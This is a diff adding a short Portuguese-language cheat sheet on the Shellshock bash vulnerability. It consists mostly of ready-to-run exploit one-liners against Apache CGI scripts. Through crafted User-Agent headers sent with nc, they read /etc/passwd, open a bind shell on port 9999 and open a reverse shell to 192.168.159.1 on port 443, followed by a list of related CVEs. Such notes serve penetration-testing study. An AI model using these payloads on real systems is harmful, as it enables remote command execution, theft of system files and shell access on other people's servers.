@@ -1,0 +1,35 @@
+ ######   SHELLSHOCK   ######
+
+ É uma vulnerabilidade encontrada no bash que permite a execução de comandos.
+
+ Para exploração é necessário que a aplicação utilize o bash pois a vulnerabilidade explora uma falha na declaração de variáveis de ambiente.
+
+ - COMO TESTAR 
+
+ env x='() { :;}; echo Estou vulneravel' bash -c "echo Isto foi um teste"
+
+
+- CGI BIN
+
+O apache com CGI BIN utiliza o bash e salva conteúdo em variáveis de ambiente, pode ser explorado por exemplo exploitando o user agent de uma requisição para execução de código malicioso
+
+EXEMPLOS
+
+ echo -e "HEAD /cgi-bin/status HTTP/1.1\r\nUser-Agent: () { :;}; echo \$(</etc/passwd)\r\nHost: vulnerable\r\nConnection: close\r\n\r\n" | nc vulnerable 80
+
+.Bind Shell
+
+echo -e "HEAD /cgi-bin/status HTTP/1.1\r\nUser-Agent: () { :;}; /usr/bin/nc -l -p 9999 -e /bin/sh\r\nHost: vulnerable\r\nConnection: close\r\n\r\n" | nc vulnerable 80
+
+ nc vulnerable 9999
+
+ .Reverse shell
+
+nc -l -p 443
+
+echo  "HEAD /cgi-bin/status HTTP/1.1\r\nUser-Agent: () { :;}; /usr/bin/nc 192.168.159.1 443 -e /bin/sh\r\nHost: vulnerable\r\nConnection: close\r\n\r\n" | nc vulnerable 80
+
+
+- CVEs:
+
+ CVE-2014-6277, CVE-2014-6278, CVE-2014-7169,CVE-2014-7186, CVE-2014-7187
